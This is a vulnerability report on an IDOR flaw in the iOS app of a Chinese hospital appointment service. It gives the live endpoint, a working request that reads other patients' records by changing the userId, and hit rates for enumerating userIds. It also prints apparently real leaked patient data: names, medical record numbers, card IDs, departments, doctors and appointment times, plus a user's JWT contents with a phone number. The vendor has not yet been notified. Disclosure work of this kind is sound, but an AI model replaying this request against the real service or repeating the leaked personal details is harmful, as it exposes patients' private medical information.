# HXGY App IDOR Vulnerability Report

## Overview

| Field | Value |
|-------|-------|
| **Application** | 华西挂号通 (Hua Xi Gua Hao Tong) |
| **Version** | 7.1.1 |
| **Platform** | iOS |
| **Vulnerability Type** | Insecure Direct Object Reference (IDOR) |
| **Severity** | Critical |
| **Date Discovered** | 2026-04-09 |

## Affected Endpoint

```
POST /cloud/guidance/admission/queryAdmission
Host: hxgyapiv2.cd120.info
```

## Vulnerability Description

The `/cloud/guidance/admission/queryAdmission` endpoint fails to validate that the `userId` parameter in the request body matches the authenticated user from the JWT token. This allows any authenticated user to query medical records of any other user by simply changing the `userId` value.

## Technical Details

### Authentication Flow

The app uses JWT tokens for authentication, passed in both `token` and `accessToken` headers. The JWT payload contains user information:

```json
{
  "userId": "279080",
  "accountId": "293360",
  "accountNo": "13882985188",
  "name": "陈井川",
  "devicenumber": "950b9f878e670e87cec9f0779bb981455ad37be225bf5d893808139c6008080a"
}
```

### Vulnerable Request

```http
POST /cloud/guidance/admission/queryAdmission HTTP/1.1
Host: hxgyapiv2.cd120.info
token: <valid_jwt_for_user_279080>
Content-Type: application/json

{"appCode":"HXGYAPP","channelCode":"PATIENT_IOS","userId":"279078"}
```

The server returns records for userId `279078` despite the JWT belonging to userId `279080`.

### Proof of Concept Results

| userId | Patient Name | Department | Status |
|--------|-------------|------------|--------|
| 279080 | 陈井川 | Multiple | Owner (legitimate) |
| 279078 | 钟南山 | 眼科 | **Leaked** |
| 279070 | 熊希萌 | 急诊科 | **Leaked** |
| 280000 | 何昌清 | 甲状腺外科 | **Leaked** |

## Data Exposure

The following PII is exposed for any user:

- Full patient name (patientName)
- Sex/gender
- Hospital visit history with dates
- Department and diagnosis information
- Doctor names and IDs
- Medical record numbers (pmi, pmiNo)
- Card IDs (cardId)
- Hospital locations

### Real Example Data Retrieved (userId: 279078)

```json
{
  "seq": "1916643732526129153",
  "type": "OFFLINE",
  "organCode": "HID0101",
  "organName": "四川大学华西医院",
  "deptName": "眼科",
  "cardId": "767948697713360896",
  "admId": "193768546",
  "userId": "279078",
  "sex": 1,
  "patientName": "钟南山",
  "admNo": null,
  "medicalDiagnosisNumber": "1",
  "pmi": "16957642",
  "pmiNo": "0016977239",
  "hospitalName": "四川大学华西医院",
  "hospitalArea": "华西坝院区",
  "hospitalAddress": "成都市武侯区国学巷37号",
  "toDoEventNum": 0,
  "doctorId": "4028b881646e3d8701646e3d876101cc",
  "doctorName": "马可",
  "admTime": "2025-05-05 星期一 下午 12:30-13:00",
  "admTimeToComputation": "2025-05-05T00:00:00",
  "createTime": "2025-04-28T08:00:50"
}
```

### Exposed Fields Breakdown

| Field | Example Value | Sensitivity |
|-------|---------------|-------------|
| `patientName` | 钟南山 | **High** - Full legal name |
| `sex` | 1 (Male) | Medium - Gender |
| `pmi` | 16957642 | **High** - Patient Medical ID |
| `pmiNo` | 0016977239 | **High** - Medical record number |
| `cardId` | 767948697713360896 | **High** - Health card ID |
| `deptName` | 眼科 (Ophthalmology) | **High** - Reveals medical conditions |
| `doctorName` | 马可 | Medium - Attending physician |
| `doctorId` | 4028b881646e3d8701646e3d876101cc | Medium - Internal ID |
| `hospitalName` | 四川大学华西医院 | Low - Hospital name |
| `hospitalArea` | 华西坝院区 | Low - Campus location |
| `hospitalAddress` | 成都市武侯区国学巷37号 | Low - Address |
| `admTime` | 2025-05-05 星期一 下午 12:30-13:00 | **High** - Appointment time |
| `medicalDiagnosisNumber` | 1 | Medium - Diagnosis sequence |

### Additional Leaked Patient Records (Sample)

| userId | Patient Name | Department | Records |
|--------|--------------|------------|---------|
| 279070 | 熊希萌 | 急诊科 (Emergency) | 1 |
| 279076 | 王军, 尹俊华 | Multiple | 11 |
| 279077 | 刘蓉, 关云兮 | Multiple | 15 |
| 279078 | 钟南山, 钟强, 兰小琼 | 眼科, 骨科 | 12 |
| 280000 | 何昌清 | 甲状腺外科 | Multiple |

## Enumeration Analysis

The `userId` parameter is the **only enumerable vector** for this IDOR. Other identifiers (`cardId`, `pmi`, `pmiNo`, `admId`) appear only in responses, not as queryable inputs.

### userId Distribution

| Range | Status | Hit Rate |
|-------|--------|----------|
| 203000-203020 | Sparse/inactive | 0% (0/21 tested) |
| 279070-279090 | Active | ~50% |
| 285000+ | Active | High |

### Observations

- `userId` is sequential numeric, making enumeration trivial
- Lower ranges (200k) appear to be older/dormant accounts with no recent hospital visits
- Higher ranges (270k-285k+) contain active users with records
- The endpoint returns empty `data: []` for valid userIds with no records (no error)

### Sample Enumeration Results

| userId | Patient | Department | Notes |
|--------|---------|------------|-------|
| 203010 | - | - | No records (dormant) |
| 285000 | 李彧 | 便民门诊 | Active, 1 record |
| 285001 | - | - | No records |
| 285002 | 徐琳珂 | 眼科 | Active, 2 records |

### Full Leaked Record Example (userId: 285002)

```json
[
  {
    "seq": "1840543598617903105",
    "type": "OFFLINE",
    "organCode": "HID0101",
    "organName": "四川大学华西医院",
    "deptName": "眼科",
    "cardId": "278942272798724096",
    "admId": "187237091",
    "userId": "285002",
    "sex": 2,
    "patientName": "徐琳珂",
    "admNo": null,
    "medicalDiagnosisNumber": "3",
    "pmi": "17575506",
    "pmiNo": "0017595099",
    "hospitalName": "四川大学华西医院",
    "hospitalArea": "华西院区",
    "hospitalAddress": "成都市武侯区国学巷37号",
    "toDoEventNum": 2,
    "doctorId": "2c93808270f1f7980171402d53016737",
    "doctorName": "向浩天",
    "admTime": "2024-10-07 星期一 下午 12:30-13:00",
    "admTimeToComputation": "2024-10-07T00:00:00",
    "createTime": "2024-09-30T08:06:04"
  },
  {
    "seq": "1840000172328595457",
    "type": "OFFLINE",
    "organCode": "HID0101",
    "organName": "四川大学华西医院",
    "deptName": "眼科",
    "cardId": "278942272798724096",
    "admId": "187218225",
    "userId": "285002",
    "sex": 2,
    "patientName": "徐琳珂",
    "admNo": null,
    "medicalDiagnosisNumber": "15",
    "pmi": "17575506",
    "pmiNo": "0017595099",
    "hospitalName": "四川大学华西医院",
    "hospitalArea": "华西院区",
    "hospitalAddress": "成都市武侯区国学巷37号",
    "toDoEventNum": 0,
    "doctorId": "1740648107444170752",
    "doctorName": "廖祺",
    "admTime": "2024-10-04 星期五 下午 14:00-14:30",
    "admTimeToComputation": "2024-10-04T00:00:00",
    "createTime": "2024-09-28T20:06:41"
  }
]
```

**Leaked PII for userId 285002:**

| Field | Value |
|-------|-------|
| Patient Name | 徐琳珂 |
| Sex | Female (2) |
| PMI | 17575506 |
| PMI No | 0017595099 |
| Card ID | 278942272798724096 |
| Department | 眼科 (Ophthalmology) |
| Doctors | 向浩天, 廖祺 |
| Hospital | 四川大学华西医院 (华西院区) |
| Appointments | 2024-10-04, 2024-10-07 |

## Impact

- **Confidentiality**: Complete breach of patient medical records
- **Compliance**: Violates medical data protection regulations
- **Scale**: Potentially affects all users (~285,000+ based on userId range)

## Remediation

### Recommended Fix

```java
// Server-side validation
String tokenUserId = extractUserIdFromJwt(request.getHeader("token"));
String requestUserId = request.getBody().getUserId();

if (!tokenUserId.equals(requestUserId)) {
    throw new UnauthorizedException("Access denied: User ID mismatch");
}
```

### Additional Recommendations

1. **Remove userId from request body entirely** - derive it from JWT
2. **Implement rate limiting** on this endpoint
3. **Add audit logging** for data access
4. **Security review** of all endpoints for similar IDOR patterns

## Timeline

| Date | Action |
|------|--------|
| 2026-04-09 | Vulnerability discovered |
| TBD | Vendor notified |
| TBD | Fix deployed |
| TBD | Public disclosure |
